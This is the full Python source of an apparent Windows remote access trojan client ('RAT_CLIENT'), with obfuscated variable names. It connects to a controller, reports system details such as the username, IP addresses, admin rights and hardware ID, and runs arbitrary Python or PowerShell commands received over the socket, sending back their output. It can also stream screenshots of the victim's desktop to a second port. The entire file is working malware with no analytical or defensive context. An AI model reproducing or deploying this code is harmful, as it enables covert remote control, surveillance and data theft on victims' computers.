import socket
import subprocess
import os
import platform
from threading import Thread
from datetime import datetime
import ctypes
import psutil
import uuid
from multiprocessing import Process
import cv2
from PIL import ImageGrab
import numpy as np
import pickle
import struct
import io
import time
user32 = ctypes .WinDLL('user32')
kernel32 = ctypes .WinDLL('kernel32')
HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2


class ScreenShare ():
    def __init__(OOO0OO0OOOO00OO00):
        OOO0OO0OOOO00OO00 .s = socket .socket(
            socket .AF_INET, socket .SOCK_STREAM)
        OOO0OO0OOOO00OO00 .host = "localhost"
        OOO0OO0OOOO00OO00 .port = 8090
        OOO0OO0OOOO00OO00 .cooldown = 0.5

    def start_screenshare(OO0O0OOOOOOOOO0O0):
        OO0O0OOOOOOOOO0O0 .s .connect(
            (OO0O0OOOOOOOOO0O0 .host, OO0O0OOOOOOOOO0O0 .port))
        OO0O0OOOOOOOOO0O0 .connected = True
        print("[*] Connected to server")
        while True:
            try:
                print("Trying to send image")
                O00O00000000O00OO = OO0O0OOOOOOOOO0O0 .get_screenshot()
                OO0O0OOOOOOOOO0O0 .s .sendall(O00O00000000O00OO)
                time .sleep(OO0O0OOOOOOOOO0O0 .cooldown)
            except Exception as OOOOO0OOOOOO0OOOO:
                print(f"Error sending image: {str(OOOOO0OOOOOO0OOOO)}")
                OO0O0OOOOOOOOO0O0 .connected = False
                break

    def get_screenshot(OO0O0O0000OO0OOOO):
        O0OO0OO000OO000OO = ImageGrab .grab()
        O0OO0OO000OO000OO .save("image.png")
        O0OO0OO0OO00O000O = open("image.png", "rb")
        OOO00O000OO0OO00O = O0OO0OO0OO00O000O .read()
        O0OO0OO0OO00O000O .close()
        os .remove("image.png")
        return OOO00O000OO0OO00O

    def stop_screenshare(O0O0000O0OOO0OOOO):
        O0O0000O0OOO0OOOO .connected = False
        O0O0000O0OOO0OOOO .s .close()


class RAT_CLIENT:
    def __init__(OO0OOOO0OO0O00000, OO00000O00000O0OO, O000000O00OOOO0OO):
        OO0OOOO0OO0O00000 .host = OO00000O00000O0OO
        OO0OOOO0OO0O00000 .port = O000000O00OOOO0OO
        OO0OOOO0OO0O00000 .curdir = os .getcwd()
        OO0OOOO0OO0O00000 .command_history = []
        OO0OOOO0OO0O00000 .screenshareClient = ScreenShare()

    def build_connection(O0O0O000OO0O00O0O):
        global s
        s = socket .socket(socket .AF_INET, socket .SOCK_STREAM)
        s .connect((O0O0O000OO0O00O0O .host, O0O0O000OO0O00O0O .port))
        s .send(O0O0O000OO0O00O0O .gather_info().encode())

    def gather_info(O0O0OOO0OOOOOOO0O):
        O0O0OOO00OOOO00OO = str(
            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}|Current_Directory:{os.getcwd().replace(':', 'colon')}")
        return O0O0OOO00OOOO00OO

    def execute(O0OO0OO00OO00O0OO):
        while True:
            O0OOOO0OO0O00O0O0 = s .recv(100024).decode()
            try:
                O0OOOO0OO0O00O0O0 = O0OOOO0OO0O00O0O0 .split("|", 1)
                OO0OO000000OOOOOO = O0OOOO0OO0O00O0O0[0].split("command_type")[
                    1].replace(":", "")
                O000O000OOO0O0000 = O0OOOO0OO0O00O0O0[1].split("command")[
                    1].replace(":", "")
                if OO0OO000000OOOOOO == "function":
                    OOO0000O0000OOO0O = O0OO0OO00OO00O0OO .handle_function(
                        O000O000OOO0O0000)
                elif OO0OO000000OOOOOO == "python":
                    OOO0000O0000OOO0O = subprocess .check_output(
                        ["python", "-c", O000O000OOO0O0000], stderr=subprocess .STDOUT, shell=True, text=True).strip()
                else:
                    OOO0000O0000OOO0O = subprocess .check_output(
                        ["powershell.exe", "-Command", O000O000OOO0O0000], stderr=subprocess .STDOUT, shell=True, text=True).strip()
            except subprocess .CalledProcessError as O00OO00O0OOO00000:
                OOO0000O0000OOO0O = str(O00OO00O0OOO00000 .output)
            s .send(OOO0000O0000OOO0O .encode())

    def handle_function(OOOO00O0O0OO00OO0, OO0O0O000000O0O00):
        if OO0O0O000000O0O00 == "screen_share":
            OOOO00O0O0OO00OO0 .screen_share_process = Process(
                target=OOOO00O0O0OO00OO0 .screenshareClient .start_screenshare)
            OOOO00O0O0OO00OO0 .screen_share_process .start()
            return "Screen share started successfully at port 8080"
        elif OO0O0O000000O0O00 == "stop_screen_share":
            OOOO00O0O0OO00OO0 .screenshareClient .stop_screenshare()
            OOOO00O0O0OO00OO0 .screen_share_process .terminate()
            return "Screen share stopped successfully"


rat = RAT_CLIENT('localhost', 4444)
if __name__ == '__main__':
    rat .build_connection()
    rat .execute()
